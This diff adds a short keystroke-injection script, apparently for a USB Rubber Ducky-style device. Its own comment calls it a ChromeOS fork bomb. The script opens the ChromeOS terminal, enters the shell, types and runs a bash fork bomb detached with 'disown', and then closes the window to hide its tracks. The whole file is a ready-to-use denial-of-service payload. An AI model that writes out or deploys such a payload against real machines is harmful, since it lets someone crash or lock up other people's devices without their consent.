@@ -1,0 +1,14 @@
+REM: CRSarmv7l This is fork bomb script for ChromeOS
+DELAY 1000
+CTRL-ALT t
+DELAY 1300
+STRING shell
+DELAY 500
+ENTER
+DELAY 750
+STRING :(){ :|:& };: & disown
+ENTER
+DELAY 100
+CTRL w
+DELAY 100
+ENTER
